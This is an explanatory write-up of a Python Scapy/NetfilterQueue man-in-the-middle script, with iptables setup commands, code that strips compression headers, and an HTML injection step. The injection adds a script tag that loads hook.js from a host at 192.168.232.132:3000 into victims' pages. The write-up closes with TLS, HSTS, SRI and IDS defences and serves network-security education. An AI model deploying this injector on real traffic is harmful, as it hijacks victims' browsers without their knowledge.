# Deep Dive: Understanding Network Packet Interception & Payload Modification

In network security and protocol analysis, understanding how data flows across the wire—and how unencrypted communications can be inspected or modified in transit—is a fundamental concept. 

This document breaks down a Python demonstration script that uses **Scapy** and **NetfilterQueue** to perform real-time packet interception, HTTP header manipulation, and response payload modification on unencrypted network traffic.

---

##Executive Overview

When network traffic is sent over plain, unencrypted HTTP (Port 80), it passes across intermediary devices as cleartext. If an intermediary node controls the routing queue (for example, via ARP spoofing or direct gateway access), it can inspect, alter, and re-inject network packets before they reach their destination.

The analyzed script demonstrates this exact mechanism:
1. **Queue Interception**: Redirects network packets from the kernel to user-space using `iptables` and Linux `NFQUEUE`.
2. **Decompression Enforcement**: Intercepts HTTP requests to strip compression headers (`Accept-Encoding`), forcing servers to respond with raw, uncompressed HTML.
3. **Payload Modification**: Intercepts HTTP responses, injects content into the HTML `<body>`, recalculates header lengths, and corrects checksums.
4. **Packet Forwarding**: Re-packages and transmits the modified packet to the target recipient.

---

##Architecture & Requirements

### System Prerequisites
- **Operating System**: Linux (requires `iptables` and kernel `netfilter` support).
- **Python Runtime**: Legacy Python 2.7 environment.
- **Key Libraries**:
  - `scapy`: Packet manipulation and parsing library.
  - `netfilterqueue`: Python bindings for `libnetfilter_queue`.
  - `re`: Built-in Regular Expressions library.

### Network Pre-configuration (Linux Kernel)
Before user-space packet inspection can occur, network traffic must be directed into an `NFQUEUE`. The script relies on standard Linux `iptables` rules:

```bash
# Queue outbound packets
iptables -I OUTPUT -j NFQUEUE --queue-num 0

# Queue incoming packets for local testing
iptables -I INPUT -j NFQUEUE --queue-num 0

# Flush iptables rules when complete
iptables --flush
```

---

##Technical Code Breakdown

### 1. Packet Re-calculation & Checksum Fixes (`set_load`)

Whenever a TCP/IP packet's payload is modified, its size changes and the existing checksums become invalid. If invalid checksums are sent, recipient operating systems or routers will drop the packet.

```python
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
```

* **Payload Update**: Overwrites the `Raw` layer content with the new modified `load`.
* **Checksum Invalidation**: By deleting `len` and `chksum` attributes from the `IP` and `TCP` layers, Scapy automatically recalculates correct lengths and checksums when the packet is serialized back into raw bytes.

---

### 2. Traffic Interception & Packet Processing (`process_packet`)

The core callback function processes each packet held in the netfilter queue.

```python
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
```

#### A. Disabling Compression on Outgoing Requests (Port 80)

Web servers frequently compress HTTP responses (using Gzip or Deflate) to save bandwidth. Compressed payloads cannot be easily searched or modified via simple string substitution.

```python
if scapy_packet[scapy.TCP].dport == 80:
    print("[+] Request")
    load = re.sub("Accept-Encoding.*?\r\n", "", load)
```

* **Targeting Destination Port 80**: Identifies outbound HTTP requests.
* **Regex Stripping**: Removes the `Accept-Encoding` request header. This tricks the web server into sending plain, uncompressed HTML in its response.

#### B. Injecting Content on Incoming Responses (Sport 80)

When the web server replies, the script inspects the incoming payload for HTML content.

```python
elif scapy_packet[scapy.TCP].sport == 80:
    print("[+] Response")
    injection_code = '<script src="http://192.168.232.132:3000/hook.js"></script>'
    load = load.replace("</body>", injection_code + "</body>")
```

* **Payload Modification**: Finds the closing `</body>` tag and prepends the external script element.
* **Content-Length Recalculation**: HTTP protocol rules require the `Content-Length` header to exactly match the byte size of the HTTP body. If the length does not match, browsers may truncate the response or hang waiting for remaining data.

```python
content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
if content_length_search and "text/html" in load:
    content_length = content_length_search.group(1)
    new_content_length = int(content_length) + len(injection_code)
    load = load.replace(content_length, str(new_content_length))
```

#### C. Payload Re-binding & Forwarding

```python
if load != scapy_packet[scapy.Raw].load:
    new_packet = set_load(scapy_packet, load)
    packet.set_payload(str(new_packet))

packet.accept()
```

* **Update Check**: If changes were made, `set_load` updates the packet structure.
* **Accept Signal**: Calling `packet.accept()` signals the kernel to forward the packet to its intended destination.

---

##Defensive Engineering & Mitigations

Understanding cleartext packet manipulation highlights why modern web security standards are critical:

1. **Mandatory Encryption (HTTPS / TLS)**:
   - TLS encrypts the application layer (HTTP payload and headers). Intermediary nodes cannot view header fields like `Accept-Encoding` or modify the body text without failing cryptographic integrity checks.
2. **HTTP Strict Transport Security (HSTS)**:
   - Prevents downgrade attacks from HTTPS to HTTP, ensuring browsers refuse to connect over unencrypted channels.
3. **Subresource Integrity (SRI)**:
   - Browsers check cryptographic hashes of fetched third-party scripts to ensure they haven't been tampered with in transit.
4. **Intrusion Detection Systems (IDS/IPS)**:
   - Network monitoring tools flag anomalous packet modifications, broken TCP streams, or missing TCP options indicative of in-flight manipulation.

---

##Summary Flow Diagram

```
[ Client ] 
   │
   ├── (1) HTTP Request (Port 80) ──────────────► [ NetfilterQueue ]
   │                                                    │
   │                                            Strips `Accept-Encoding`
   │                                                    │
   │                                                    ▼
   │                                              [ Web Server ]
   │                                                    │
   │ ◄── (2) HTTP Response (Plaintext HTML) ────────────┤
   │                  │
   │          Injects Script & 
   │       Updates Content-Length
   │                  │
   ▼                  ▼
[ Modified Content Rendered in Browser ]
